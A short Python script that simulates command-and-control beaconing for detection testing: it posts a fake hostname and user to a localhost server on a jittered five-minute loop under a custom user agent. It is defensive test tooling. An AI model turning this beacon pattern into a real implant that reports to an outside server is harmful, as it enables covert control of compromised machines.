#!/usr/bin/env python3
# Evil Bunny HTTP Beacon Simulator
# Generates realistic C2 traffic for detection testing

import requests
import time
import random

C2_URL = "http://localhost:8000/beacon"  # Local test server
USER_AGENT = "HopHelper/1.0"
JITTER_PERCENT = 30  # ±30% jitter

BASE_INTERVAL = 300  # 5 minutes


def beacon():
    payload = {
        "hostname": "workstation-07",
        "user": "victim",
        "timestamp": int(time.time()),
    }
    headers = {"User-Agent": USER_AGENT}

    try:
        requests.post(C2_URL, json=payload, headers=headers, timeout=10)
        print(f"[+] Beacon sent at {time.ctime()}")
    except:
        print("[-] C2 unreachable")


while True:
    jitter = random.randint(-JITTER_PERCENT, JITTER_PERCENT)
    interval = BASE_INTERVAL * (1 + jitter / 100.0)
    time.sleep(max(60, interval))  # Minimum 1 minute
    beacon()
